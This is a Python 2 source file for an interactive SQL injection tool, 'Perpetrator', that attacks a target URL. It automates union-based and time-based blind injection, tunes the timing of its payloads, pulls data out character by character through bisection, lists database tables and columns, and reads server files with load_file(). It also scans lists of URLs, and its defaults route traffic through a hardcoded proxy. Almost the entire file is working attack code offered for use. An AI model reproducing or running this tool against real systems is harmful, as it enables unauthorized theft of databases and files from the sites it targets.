# -*- coding: utf-8 -*-
import logging, urllib, urllib2, time, re, md5, sys, urlparse
import string
import random
import settings
from sql import *
from caching import CacheHandler
import socket

## try:
##     import cmd2 as cmd
## except ImportError:
##     import cmd

import cmd

def _make_analyzer(compression_function, amplification=4, fmt="%.3f"):
    def _analyzer(s):
        if not s: return 0
        s = s * amplification
        return fmt % (float(len(compression_function(s))) / len(s),)
    return _analyzer

def _most_frequent_chars(s, best=15):
    stats = {}
    for c in s:
        if c in string.printable and not c.isspace():
            stats[c] = stats.get(c, 0) + 1
    def _cmp(a,b):
        return -cmp(a[1],b[1])
    sorted_stats = sorted(stats.items(), _cmp)
    return "".join([c*max(1,cnt*best/len(s)) for (c,cnt) in sorted_stats[:best]])

class Attacker:
    TEST_FORMATS = []
    def __init__(self, perpetrator):
        self.perpetrator = perpetrator
        self.output = None
    def launch(self, query):
        logging.debug("%s with query '%s'" % (self, query))
        response = self.perpetrator.open_with(self.inject(query))
        return self.extract_output(response)
        
    def extract_output(self, response): abstract
    def autoconfig(self): abstract

    def inject(self, query): abstract

    def __str__(self):
        return self.__class__.__name__
    
class BaseUnionSqlInjection(Attacker):
    def inject(self, query):
        injection = self.perpetrator.options.union_injection_format % query
        logging.debug("Injection: '%s'" % (injection))
        return injection

    def extract_output(self, response):
        content = response.read()
        return content

class UnionSqlInjection(BaseUnionSqlInjection):
    TEST_FORMATS = settings.UNION_TEST_FORMATS
    def __init__(self, perpetrator):
        Attacker.__init__(self, perpetrator)
        #self.token = md5.md5(str(time.time())).hexdigest()[:6]
        self.token = md5.md5(perpetrator.options.url_format).hexdigest()[:6]
        
    def inject(self, query):
        query = self.tokenize(query)
        logging.debug("Tokenized query: '%s'" % (query))
        return BaseUnionSqlInjection.inject(self, query)

    def get_token(self, prefix=""):
        return str(prefix) + self.token

    def tokenize_select_expressions(self, expressions):
        ans = []
        for expression in expressions:
            if ans: ans += [String(self.get_token("sep"))]
            ans += [expression]
        ans = [String(self.get_token("begin"))] + ans + [String(self.get_token("end"))]
        exps = [NULL]* self.perpetrator.options.columns
        exps[self.perpetrator.options.column_index] = Binary(Concat(ans))
        return exps
        
    def tokenize(self, query):
        if isinstance(query, Select):
            query = query.copy()
            query.select_expressions = \
               self.tokenize_select_expressions(query.select_expressions)
                                        
        return query

    def extract_output(self, response):
        content = response.read()
        #self.perpetrator.analyze_response_content(content)
        r = re.compile("%s(.*?)%s" % (self.get_token("begin"), self.get_token("end")),
                       re.M|re.S)
        ts = r.findall(content)
        if not ts:
            return None
        else:
            return ts[0].split(self.get_token("sep"))

    def autoconfig(self):
        attacker = BaseUnionSqlInjection(self.perpetrator)
        
        for format in self.TEST_FORMATS:
            self.perpetrator.options.union_injection_format = format
            for columns in range(1, self.perpetrator.options.max_columns):
                logging.debug("%d columns" % columns)
                self.perpetrator.options.columns = columns
                q = Select([String(self.get_token(i)) for i in range(columns)])
                try:
                    result = attacker.launch(q)
                    for column_index in range(columns):
                        if self.get_token(column_index) in result:
                            self.perpetrator.options.column_index = column_index
                            logging.info("Sucessfully configured")
                            ## TODO: details
                            return ["union_injection_format",
                                    "column_index",
                                    "columns"]
                except Exception, e:
                    logging.warning("Error while configuring: %s" % (e))
        logging.error("Could not configure automatically")


class BaseBlindSqlInjection(Attacker):
    def test_query(self, query):
        return self.test_with(self.inject(query))

    def _bisect(self, query, expression, value_range, fancy=True):
        value_range = sorted(value_range)
        min_i, max_i = 0, len(value_range)-1
        cnt = 0
        while min_i<max_i:
            i = (max_i+min_i)/2
            if i == min_i: i = max_i
            v = value_range[i]
            if fancy:
                c = None
                if len(value_range)==256:
                    c = chr(i)
                if not (c and c in string.printable and not c.isspace()):
                    ARROWS = "-\|/"
                    c = ARROWS[cnt%len(ARROWS)]
                print "%c\r" % c,
                sys.stdout.flush()
                    
            logging.debug("Trying %d (%d)" % (v, i))
            condition = "%s<0x%x" % (expression, v)
            sel = self.prepare_query(query, condition)
            logging.debug("Query %s" % sel)
            if self.test_query(sel):
                max_i = i-1
            else:
                min_i = i
            cnt += 1
        return value_range[min_i]
    
    def test(self, expression):
        logging.debug("Testing: %s" % expression)
        timed_expression = self.prepare_condition(expression)
        result = self.test_with(self.inject(timed_expression))
        logging.debug("Result: %s" % result)
        return result

    def test_with(self, what):
        raise "Must implement"

    def prepare_query(self, base_query, condition):
        sel = base_query.copy()
        sel.select_expressions = [self.prepare_condition(condition)]
        return sel

    def launch(self, query):
        logging.debug("%s with query '%s'" % (self, query))
        results = []

        if isinstance(query, Select):
            for select_expression in query.select_expressions:
                if self.test_query(self.prepare_query(query, "length(%s)>0" % select_expression)):
                    length = self._bisect(query, "length(%s)" % (select_expression),
                                          range(1, self.perpetrator.options.max_length))
                else:
                    length = 0
                if length:
                    logging.debug("Length found: %d" % length)
                else:
                    results.append(None)
                    continue
                result = ""
                start = time.time()
                per_sec = 0
                eta = length*10*self.perpetrator.options.blind_time_high
                print " -> (len: %d eta: %d)\r" % (length, eta),
                for i in range(length):
                    c = self._bisect(query, "substring(%s,%d,1)" % (select_expression, i+1), range(256))
                    result += chr(c)
                    sys.stdout.flush()
                    per_sec = (i+1)/(time.time()-start)
                    eta = (length-i)/per_sec
                    print " ->%s (%d/%d eta: %d)\r" % (result.split("\n")[-1],
                                                       i+1,
                                                       length, eta),
                print "   %s                    \r" % (" "*len(result)),
                results.append(result)
        return results

    def inject(self, expression):
        return self.perpetrator.options.blind_injection_format % expression
    
class TimeBasedBlindSqlInjection(BaseBlindSqlInjection):
    TEST_FORMATS = settings.BLIND_TEST_FORMATS


    def prepare_query(self, base_query, condition):
        sel = base_query.copy()
        sel.select_expressions = [self.prepare_condition(condition)]
        if not sel.limit:
            sel.limit = "1"
        return sel

    def prepare_condition(self, expression):
        return self.perpetrator.options.blind_sleep_format % (
            expression,
            self.perpetrator.options.blind_time_sleep)        

    def test_with(self, what):
        for i in range(self.perpetrator.options.blind_max_retries):
            response_time = self._test_time(what)
            ans = self._analyze_timing(response_time)
            if not ans is None:
                return ans
            else:
                logging.debug("Timing unstable, retrying")
        raise self.TimingTooUnstable

    def _analyze_timing(self, response_time):
        options = self.perpetrator.options
##         print "Timing"
##         print response_time
        def _in_range(t, rng):
            return t>=rng[0] and t<=rng[1]
        
        low_interval = options.blind_time_low-options.blind_time_confidence,\
                       options.blind_time_low+options.blind_time_confidence
        high_interval = options.blind_time_high-options.blind_time_confidence,\
                        options.blind_time_high+options.blind_time_confidence

##         print low_interval, high_interval, response_time
##         print _in_range(response_time, low_interval), \
##               _in_range(response_time, high_interval)
        if _in_range(response_time, low_interval):
            return False
        elif _in_range(response_time, high_interval):
            return True
        else:
            return None
        #return response_time >= self.perpetrator.options.blind_time_threshold

    class TimingTooUnstable(Exception): pass


    def _test_time(self, what):
        response = self.perpetrator.open_with(what,
                                              timeout=self.perpetrator.options.blind_time_high)
        return response.response_time
        

##         response = self.perpetrator.open_with(self.inject(query))
##         return self.extract_output(response)


    def time(self, expression):
        timed_expression = self.prepare_condition(expression)
        return self._test_time(self.inject(timed_expression))

    def autoconfig(self):
        def _do_stats(times):
            mean = sum(times)/len(times)
            dev = (sum([(t-mean)**2 for t in times])/len(times))**0.5
            return mean, dev
        if self.perpetrator.options.cache:
            logging.warning("Disabling cache and setting random urls")
            self.perpetrator.options.cache = False
            self.perpetrator.options.randomize_url = True
            self.perpetrator.init_options()
            
        logging.info("Checking injections")
        opts = self.perpetrator.options

        def _calibrate1():
            for sleep_format in settings.BLIND_SLEEP_FORMATS:
                logging.debug("Trying %s" % sleep_format)
                opts.blind_sleep_format = sleep_format
                for format in settings.BLIND_TEST_FORMATS:
                    opts.blind_injection_format = format
                    
                    ts = [self.time("0") for i in range(3)]
                    mean, dev = _do_stats(ts)
                    dev = max(0.05, dev)
                    t = self.time("1")
                    if t>mean+dev*2: ## TODO: hardoded
                        logging.info("Injection found")
                        return mean, dev, t
            return False

        def _calibrate2():
            mean, dev = opts.blind_time_low, opts.blind_time_confidence
            last_ok = last_t = None
            lower_limit = (opts.blind_time_low + opts.blind_time_confidence*2)
            while True:
                opts.blind_time_sleep = opts.blind_time_sleep*0.5
                logging.debug("Trying sleep time %.4f" % opts.blind_time_sleep)
                ts = []
                while len(ts)<10 \
                          and sum(ts)<1 \
                          and len([t for t in ts
                                   if t<lower_limit])<3:
                    ts.append(self.time("1"))
                t, _dev = _do_stats(ts)
                logging.debug("Average: %.4f" % t)
                if t<lower_limit: ##TODO
                    if not last_ok:
                        return None
                    opts.blind_time_sleep = last_ok
                    opts.blind_time_high = last_t
                    return True
                last_ok = opts.blind_time_sleep
                last_t = t

        def _calibrate3():
            while _check():
                opts.blind_time_high *= 0.5
                logging.debug("High: %.3f", opts.blind_time_high)
            while not _check():
                opts.blind_time_high /= 0.75
                logging.debug("High: %.3f", opts.blind_time_high)
            return True
            
        cal1 = _calibrate1()
        if not cal1:
            logging.error("Could not find injection")
            return
        logging.info("Mean: %.3f, dev: %.3f, high: %.3f" % cal1)
        opts.blind_time_low, opts.blind_time_confidence, t = cal1

        logging.info("Calibrating")
        cal2 = _calibrate2()
        if not cal2:
            logging.error("Could not find suitable timing")
            return            

        logging.info("Fine tuning")
        _calibrate3()
        
        logging.info("Sucessfully configured")
        return ["blind_injection_format",
                "blind_sleep_format",
                "blind_time_sleep",
                "blind_time_low",
                "blind_time_high",
                "blind_time_confidence",
                ]
    
        def _check():
            return not self.test("0") and self.test("1")
        def _find_format():
            for sleep_format in settings.BLIND_SLEEP_FORMATS:
                self.perpetrator.options.blind_sleep_format = sleep_format
                for format in settings.BLIND_TEST_FORMATS:
                    self.perpetrator.options.blind_injection_format = format
                    if _check():
                        return True
            return False
        if not _find_format():
            logging.error("Could not configure automatically")
            return
        logging.info("Injection OK. Calibrating...")
        times = []
        timed_expression = self.prepare_condition("0")
        start = time.time()
        while len(times)<30 and (time.time()-start)<30:
            response = self.perpetrator.open_with(self.inject(timed_expression))
            times.append(response.response_time)
            logging.debug("Try %d: %.2f" % (len(times), response.response_time))
        mean, dev = _do_stats(times)
        logging.debug("Average time %.3f, std dev %.5f" % (mean, dev))
        sleep_time = round(max(0.1, mean/3, dev*3), 2)
        confidence = dev
        self.perpetrator.options.blind_time_low = mean
        self.perpetrator.options.blind_time_high = mean + sleep_time
        self.perpetrator.options.blind_time_confidence = confidence
        self.perpetrator.options.blind_time_sleep = sleep_time
        logging.info("Sucessfully configured")
        return ["blind_injection_format",
                "blind_sleep_format",
                "blind_time_sleep",
                "blind_time_low",
                "blind_time_high",
                "blind_time_confidence",
                ]

class CustomBlindSqlInjection(BaseBlindSqlInjection):
    def prepare_condition(self, expression):
        return expression

    def test_with(self, what):
        response = self.perpetrator.open_with(what,
                                              timeout=self.perpetrator.options.blind_time_high)
        data = response.read()
        logging.debug("Response: %s" % data)
        return self.perpetrator.options.blind_custom_expected in data
##     def prepare_query(self, base_query, condition):
##         sel = base_query.copy()
##         sel.select_expressions = [self.prepare_condition(condition)]
##         if not sel.limit:
##             sel.limit = "1"
##         return sel

        
class Perpetrator(cmd.Cmd):
    CONTENT_ANALYZERS = [
        ("md5", lambda s: md5.new(s).hexdigest()),
        ("zlib ratio", _make_analyzer(lambda s: s.encode("zlib"))),
        ("bz2 ratio", _make_analyzer(lambda s: s.encode("bz2"))),
        ("most fr. chars", _most_frequent_chars),
        #("php warnings", _php_warnings),
        #("php errors", _php_warnings),
        ]

    ATTACK_MODES = [
        ("union", UnionSqlInjection),
        ("blind", TimeBasedBlindSqlInjection),
        ("blind_custom", CustomBlindSqlInjection),
        ]
    
    class SyntaxError(Exception):pass
    class Quit(Exception):pass
        
    def __init__(self, options):
        cmd.Cmd.__init__(self)

        self.options = options
        self.init_options()

    def init_options(self):
        prompt_cursor = ">"
        handlers = []
        
        if self.options.proxy:
            logging.info("Using proxy: %s \033[1;32mGOOD\033[0m" % self.options.proxy)
            handlers.append(urllib2.ProxyHandler({'http': self.options.proxy}))
            prompt_cursor = "\033[1;32m>\033[0m"
        else:
            logging.warning("No proxy")
            if not self.options.no_proxy_warning:
                time.sleep(5)
                prompt_cursor = "!!"
                
        if self.options.cache:
            handlers.append(CacheHandler(self.options.cache_directory))
        self.prompt = "%s%s " % (self.get_target_host(), prompt_cursor)
        self.opener = urllib2.build_opener(*handlers)

        
        
    ## http
    def post_process_http_query(self, value):
        return urllib2.quote(value.replace(" ", "\n"))

    def open_with(self, value, timeout=None):
        url = self.options.url_format % self.post_process_http_query(str(value))
        return self.open(url, timeout=timeout)

    def open(self, url, timeout=None):
        def _randomize(url):
            return url + "&%f" % random.random()
        logging.debug("Opening %s" % url)
        t = time.time()
        if self.options.randomize_url:
            url = _randomize(url)

        socket.setdefaulttimeout(timeout)            
        try:
            response = self.opener.open(url)
        except urllib2.URLError, e: ## deals with timeout for blinds
            if not isinstance(getattr(e, "reason", None), socket.timeout):
                raise e
            logging.debug("Timeout")
            ## fake response
            response = urllib.addinfourl(open("/dev/null"), [], url)
            response.code = 504
        response.response_time = time.time()-t
        logging.debug("Response code: %d" % response.code)
        logging.debug("Response time: %.5f" % response.response_time)
        return response

    def get_target_host(self):
        try:
            return urlparse.urlparse(self.options.url_format)[1]
        except:
            return ""

    ## content
    def analyze_response(self, response):
        content = response.read()
        logging.info("Analyzing content")
        self.analyze_response_content(content)

    def _analyze_response_content(self, content):
        for name, f in self.CONTENT_ANALYZERS:
            result = f(content)
            if result:
                yield name, result

    def analyze_response_content(self, content):
        for name, result in self._analyze_response_content(content):
            logging.info(" - %-15s: %s" % (name, result))

        if self.options.snap_length:
            head = self.snap(content)
            logging.info("Head:\n%s" % head)
            tail = self.snap(content, reverse=True)
            if not head == tail:
                logging.info("Tail:\n%s" % tail)
            
    def snap(self, content, etc="...", reverse=False, length=None):
        length = length or self.options.snap_length
        content = repr(content)[1:-1]
        if len(content)<length - len(etc):
            return content
        if reverse:
            return etc+content[-(length-len(etc)):]            
        else:
            return content[:length - len(etc)]+etc
    
    ## sql
    def get_attacker(self):
        return dict(self.ATTACK_MODES)[self.options.mode](self)
                
    def attack(self, query):
        return self.get_attacker().launch(query)
        
    def do_select(self, args):
        """select ...
execute the query on the remote server using current attack mode"""
        select = Select.parse(args)
        result = self.attack(select)
        logging.info("Result: %s" % result)

    def do_collect(self, args):
        """collect ...
same as select but fetches all rows"""
        select = Select.parse(args)
        s = select.copy()
        s.select_expressions = [Count("*")]
        result = self.attack(s)
        if not result and result[0]:
            logging.error("No row counted")
            return
        rows = int(result[0])
        logging.info("Fetching %d rows" % rows)
        for row in range(rows):
            select.limit = map(str, [row, 1])
            result = self.attack(select)
            logging.info("Result[%d]: %s" % (row, result))
        
    def do_cat(self, args):
        """cat /path/to/file
dumps file content from remote server"""
        if not args: raise self.SyntaxError
        filename = args
        select = Select(["load_file(%s)" % String(filename)])
        result = self.attack(select)
        if result:
            logging.info("Content of %s:\n%s" % (filename, result[0]))
        else:
            logging.error("Couldn't read file")

    def do_scan(self, args):
        """scan /local/path/to/list
scans every parameter of every listed url"""
        for url_format in [url.strip() for url in open(args)]:
            logging.info("Trying %s" % url_format)
            self.options.url_format = url_format
            self.onecmd("check")
            attacker = self.get_attacker()
            variables = attacker.autoconfig()
            if variables:
                self._log_options(variables+["url_format"])
                self.init_options()
                self.onecmd("probe")
                break

    ## mysql
    def do_tables(self, args):
        """tables database"""
        database = args
        if database:
            database = String(database)
        else:
            database = CurrentDatabase()
        result = self.attack(Select.parse("count(distinct(table_name)) from information_schema.columns where table_schema = %s" % database))
        logging.info("%s tables found" % result[0])
        for i in range(int(result[0])):
            result = self.attack(Select.parse("distinct table_name from information_schema.columns where table_schema = %s limit %d,1" % (database, i)))
            logging.info("Table %s" % result[0])
            
    def do_columns(self, args):
        """columns database.table"""
        if "." in args:
            database, table = map(String, args.split("."))
        else:
            database = CurrentDatabase()
            table = String(args)
        result = self.attack(Select.parse("count(distinct(column_name)) from information_schema.columns where table_schema = %s and table_name = %s" % (database, table)))
        logging.info("%s columns found" % result[0])
        for i in range(int(result[0])):
            result = self.attack(Select.parse("distinct column_name from information_schema.columns where table_schema = %s and table_name = %s limit %d,1" % (database, table, i)))
            logging.info("Column %s" % result[0])

    ## scripting
    def do_for(self, args):
        m = re.match("(?P<variable>\w+) in (?P<expression>.*): (?P<command>.*)",
                     args)
        if not m:
            raise self.SyntaxError
        expression = eval(m.group("expression"))
        for val in expression:
            cmd = m.group("command") % {m.group("variable"): val}
            logging.info("forloop %s = %s> %s" % (m.group("variable"), val, cmd))
            self.onecmd(cmd)

    ## misc
    def do_quit(self, args):
        raise self.Quit
    do_EOF = do_quit

    def do_open(self, args):
        """open params
fetch and analyse page given raw get parameter"""
        response = self.open_with(args)
        self.analyze_response(response)

    def do_save(self, args):
        import pickle
        config_file = args or settings.DEFAULT_CONFIGFILE
        logging.info("Saving options to %s" % (config_file))
        pickle.dump(self.options, open(config_file, "w"))

    def do_load(self, args):
        import pickle
        config_file = args or settings.DEFAULT_CONFIGFILE
        logging.info("Loading options from %s" % config_file)
        self.options = pickle.load(open(config_file))
        self.init_options()

    def get_option_names(self):
        return [variable for variable in dir(self.options)
                if not variable.startswith("_") \
                and hasattr(self.options, variable) \
                and not callable(getattr(self.options, variable))]
                
    def do_set(self, args):
        """set [variable [value]]"""
        if not " " in args:
            self._log_options([v for v in self.get_option_names()
                               if not args or v.startswith(args)])
        else:
            variable, value = args.split(" ", 1)
            ## old_value = getattr(perpetrator.options, variable, None)
            try:
                value = float(value)
            except ValueError:
                pass
            setattr(self.options, variable, value)
            if variable=="debug":
                logger = logging.getLogger()

                if value:
                    logger.setLevel(logging.DEBUG)
                    logger.info("debug enabled")
                else:
                    logger.setLevel(logging.INFO)
                    logger.info("debug disabled")
            elif variable in ["url_format", "proxy", "cache"]:
                self.init_options()
            

    def complete_set(self, text, line, begidx, endidx):
        if len(line[:begidx].strip().split())>=2:
            return []
        return [name+" " for name in self.get_option_names()
                if name.startswith(line[begidx:endidx])]
        

    def do_GET(self, args):
        """GET url
Open the given url and analyzes returned page"""
        response = self.open(args)
        self.analyze_response(response)


    ## utility commands
        
##     def do_check(self, args):
##         for group, candidates in settings.INJECTION_TESTS:
##             logging.info("Checking %s" % group)
##             analyzes = []
##             for candidate in candidates:
##                 logging.debug(" %s" % (repr(candidate)))
##                 try:
##                     response = self.open_with(candidate)
##                     content = response.read()
##                     analyze = self._analyze_response_content(content)
##                     logging.info("%-10s %6.3f %s" % (candidate,
##                                                      response.response_time,
##                                                      " ".join([self.snap(result, length=20, etc="..")
##                                                                for name, result in analyze])))
##                 except Exception, e:
##                     logging.warning("Error: %s" % e)
##                 logging.debug("-"*40)

##     def complete_check(self, text, line, begidx, endidx):
##         if len(line[:begidx].strip().split())>=2:
##             return []
##         return [check['trigger'] for check in settings.CHECKS
##                 if check['trigger'].startswith(line[begidx:endidx])]

    def do_check(self, args):
        """check [group]
check some simple injection patterns and compare returned contents"""
        import Levenshtein
        def _analyze(s):
            response = self.open_with(s)
            content = response.read()
            results = list(self._analyze_response_content(content))
            results = [
                ["response_time", "%.1fs" % response.response_time]] + results
            return content, results
            
        def _log(s, results, flag=None):
            if flag is None:
                smile = "   "
            elif flag:
                smile = "\033[1;32m:-)\033[0m"
            elif flag is False:
                smile = ":-("
                
            logging.info("%-10s %s %s" % (
                s, smile, " ".join([self.snap(result, length=25, etc="..")
                                    for name, result in results])))
        def _cmp(results1, results2):
            def _vals(l):
                return [v for n,v in l]
            if results1:
                return len([r1 for (r1,r2) in zip(_vals(results1),
                                                  _vals(results2))
                            if r1==r2]) / float(len(results1))
        def _cmp(content1, content2):
            return Levenshtein.ratio(content1, content2)
        
        def _is_good(b, name):
            if name=="same":
                return b>self.options.similarity_threshold
            elif name=="different":
                return b<self.options.similarity_threshold
            
        for check in settings.CHECKS:
            if args and not check['trigger'].startswith(args): continue
            logging.info("Checking %s" % check['title'])
            try:
                master_content, master = _analyze(check['master'])
            except Exception, e:
                logging.warning("Error while analyzing: %s" % (e))
                continue
            _log(check['master'], master)
            for group in ["same", "different", "extra"]:
                logging.debug("%s" % group)
                for s in check.get(group, []):
                    try:
                        content, results = _analyze(s)
                    except Exception, e:
                        logging.warning("Error while analyzing %s: %s" % (group, e))
                        continue
                    delta = _cmp(content, master_content)
                    results = [
                        ("delta", "%.2f" % delta)] + results
                    _log(s, results, flag=_is_good(delta, group))

    def complete_check(self, text, line, begidx, endidx):
        return [check['trigger'] for check in settings.CHECKS
                if check['trigger'].startswith(line[begidx:endidx])]
            

    def do_probe(self, args):
        """probe [name]
probe the target server for various information"""
        if args:
            probes = [(name, q) for (name, q) in settings.PROBES
                      if name.lower()==args.lower()]
        else:
            probes = settings.PROBES
            
        for probe_name, probe_query in probes:
            logging.debug("Probing %s" % probe_name)
            result = self.attack(probe_query)
            if result and result[0]:
                logging.info("%s: %s" % (probe_name, result))
    def complete_probe(self, text, line, begidx, endidx):
        #begidx = line.index(" ")
        return [name+" " for name, q in settings.PROBES
                if name.startswith(line[begidx:endidx])]

    def _log_options(self, variables):
        for variable in variables:
            logging.info("Config %s = %s" % (variable,
                                             repr(getattr(self.options,
                                                          variable, 0))))

    def do_configure(self, args):
        """configure
configure current attack mode automatically"""
        logging.info("Launching autoconfiguration")
        variables = self.get_attacker().autoconfig()
        if variables:
            self._log_options(variables)
        

def main():

    from optparse import OptionParser

    parser = OptionParser()
    parser.add_option("-q", "--quiet",
                      action="store_false", dest="verbose", default=True,
                      help="print many status messages to stdout")
    parser.add_option("-d", "--debug",
                      action="store_true", dest="debug", default=False,
                      help="don't print status messages to stdout")
    
    parser.add_option("--no-proxy", "--no-proxy-warning", 
                      action="store_true", dest="no_proxy_warning",
                      default=False,
                      help="disable notice + sleep when no proxy set")

    parser.add_option("-u", "--url",
                      #default="http://212.198.75.37/www.tmp/sql.php?i=%s",
                      dest="url_format", help="target url format")
    
    parser.add_option("--union-format", default="0 union (%s)",
                      dest="union_injection_format",
                      help="injection format (eg. '0) %s #')")
    parser.add_option("-c", "--columns", dest="columns", type="int",
                      default=1, help="number of columns")
    parser.add_option("--column-index", dest="column_index", type="int",
                      default=0, help="column to use for union")
    parser.add_option("--max-columns", dest="max_columns", type="int",
                      default=10, help="max number of columns to check")
    
    parser.add_option("--blind-format", default="1 and (%s)",
                      dest="blind_injection_format",
                      help="injection format (eg. '0 and (%s) #')")
    parser.add_option("--blind-sleep-format", default="%s AND SLEEP(%.1f)",
                      dest="blind_sleep_format",
                      help="sleep format (eg. '%s AND SLEEP(%d)')")
    parser.add_option("--max-length", dest="max_length", type="int",
                      default=128,
                      help="max length to guess")
    parser.add_option("--blind-time-sleep", dest="blind_time_sleep",
                      type="float", default=3,
                      help="time based blind injection timing")
    parser.add_option("--blind-time-low", dest="blind_time_low",
                      type="float", default=0,
                      help="time based blind injection timing")
    parser.add_option("--blind-time-high", dest="blind_time_high",
                      type="float", default=3,
                      help="time based blind injection timing")    
    parser.add_option("--blind-time-confidence", dest="blind_time_confidence",
                      type="float", default=1,
                      help="timing confidence interval")
    parser.add_option("--blind-max-retries", dest="blind_max_retries",
                      type="int", default=3,
                      help="max retries when timing is unstable")
    parser.add_option("--blind-custom-expected", dest="blind_custom_expected",
                      help="string to expect in case of success")

    parser.add_option("--similarity-threshold", dest="similarity_threshold",
                      type="float",
                      default=0.85, help="threshold when comparing pages")

    parser.add_option("--snap-length", dest="snap_length",
                      type="int", help="size of snippets",
                      default=200)    

    parser.add_option("-p", "--proxy",
                      default="http://134.151.255.180:3128",
                      dest="proxy", help="proxy")

    parser.add_option("--cache-directory",
                      default="cache",
                      dest="cache_directory", help="cache directory")
    parser.add_option("--no-cache", dest="cache", action="store_false",
                      default=True, help="disable cache")
    parser.add_option("--randomize-url", dest="randomize_url",
                      action="store_true",
                      default=False, help="append random parameter to url")

    parser.add_option("-m", "--mode", default="union", dest="mode",
                      help="attack mode (%s)" % ", ".join(dict(Perpetrator.ATTACK_MODES).keys()))
    parser.add_option("--batch", action="store_true", dest="batch",
                      default=False,
                      help="batch (no prompt)")

    (options, args) = parser.parse_args()

    logger = logging.getLogger()
    
    if options.debug:
        logger.setLevel(logging.DEBUG)        
    elif options.verbose:
        logger.setLevel(level=logging.INFO)        
    else:
        logger.setLevel(level=logging.WARNING)

    log_handler = logging.StreamHandler()
    formatter = logging.Formatter("%(levelname)s - %(message)s")
    log_handler.setFormatter(formatter)
    logger.addHandler(log_handler)
    
    p = Perpetrator(options)
    if args:
        for arg in args:
            p.onecmd(arg)
    if not args or not options.batch:
        while True:
            try:
                p.cmdloop()
            except KeyboardInterrupt:
                print
            except p.Quit:
                print
                break
            except p.SyntaxError:
                logging.error("Syntax error")
            except Exception, e:
                logging.error("Error: %s" % e)
                import traceback
                traceback.print_exc()

if __name__=="__main__":
    #print Select.parse("user from mysql.user")
    #print Select.parse("1")
    main()
    #traceback.
